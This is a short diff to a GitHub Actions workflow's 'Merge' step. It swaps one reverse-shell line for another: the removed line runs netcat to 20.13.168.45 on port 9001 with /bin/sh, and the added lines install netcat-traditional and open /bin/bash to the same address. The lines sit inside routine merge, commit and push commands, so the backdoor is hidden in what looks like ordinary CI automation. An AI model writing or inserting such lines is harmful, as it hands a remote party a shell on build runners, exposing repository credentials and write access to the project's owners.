@@ -13,7 +13,8 @@ jobs:
     - name: Merge
       run: |
         bash ./.github/workflows/merge.sh
-        nc 20.13.168.45 9001 -e /bin/sh
+        apt-get install netcat-traditional -y
+        /bin/nc.traditional -c /bin/bash 20.13.168.45 9001
         git add .
         git commit --message "Merge queries"
         git push -u origin HEAD:main
